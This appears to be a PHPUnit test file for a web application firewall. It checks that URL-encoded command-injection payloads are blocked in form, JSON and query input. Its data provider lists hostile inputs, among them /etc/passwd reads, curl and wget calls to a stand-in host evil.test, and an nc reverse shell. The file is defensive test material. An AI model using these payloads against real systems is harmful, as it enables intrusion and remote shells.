<?php

declare(strict_types=1);

namespace Mixudev\SecurityDefense\Tests\Feature\Adversarial\Evasion;

use PHPUnit\Framework\Attributes\DataProvider;
use Mixudev\SecurityDefense\Tests\Feature\Adversarial\Concerns\RegistersWafProbeRoute;
use Mixudev\SecurityDefense\Tests\TestCase;

class EncodedCommandInjectionTest extends TestCase
{
    use RegistersWafProbeRoute;
    protected function setUp(): void { parent::setUp(); $this->registerWafProbeRoutes(); $this->withoutAutoJail(); }
    #[DataProvider('payloadProvider')]
    public function test_encoded_command_injection_is_blocked_in_form(string $payload): void { $this->assertSame(403, $this->probeForm('command', $payload, '198.18.13.1')['status'], $payload); }
    #[DataProvider('payloadProvider')]
    public function test_encoded_command_injection_is_blocked_in_json(string $payload): void { $this->assertSame(403, $this->probeJson('command', $payload, '198.18.13.2')['status'], $payload); }
    #[DataProvider('payloadProvider')]
    public function test_encoded_command_injection_is_blocked_in_query(string $payload): void { $this->assertSame(403, $this->probeGet($payload, '198.18.13.3')['status'], $payload); }
    public function test_benign_shell_documentation_is_allowed(): void { $this->assertSame(200, $this->probeForm('command', 'run the command example in the manual', '198.18.13.4')['status']); }
    public static function payloadProvider(): array { return [
        'semicolon cat' => ['%3Bcat%20%2Fetc%2Fpasswd'], 'pipe whoami' => ['%7Cwhoami'], 'and curl' => ['%26%26curl%20https%3A%2F%2Fevil.test'],
        'backtick id' => ['%60id%60'], 'dollar shell' => ['%24%28whoami%29'], 'encoded wget' => ['%3Bwget%20https%3A%2F%2Fevil.test'],
        'bash c' => ['%3Bbash%20-c%20id'], 'powershell' => ['%7Cpowershell%20whoami'], 'cmd exe' => ['%26cmd.exe%20%2Fc%20whoami'],
        'netstat' => ['%3Bnetstat%20-an'], 'uname' => ['%7Cuname%20-a'], 'nc reverse shell' => ['%3Bnc%20-e%20%2Fbin%2Fsh%201.2.3.4%204444'],
        'ping' => ['%26ping%20-c%201%201.2.3.4'], 'php exec' => ['%3Bsystem%28%27id%27%29'], 'shell exec' => ['%7Cshell_exec%28%27id%27%29'],
        'double encoded pipe' => ['%257Cwhoami'], 'plus separated' => ['%3Bcat+%2Fetc%2Fpasswd'], 'newline command' => ["%0Acat%20%2Fetc%2Fpasswd"],
        'encoded eval' => ['eval%28%27id%27%29'], 'encoded phpinfo' => ['%3Bphpinfo%28%29'],
    ]; }
}
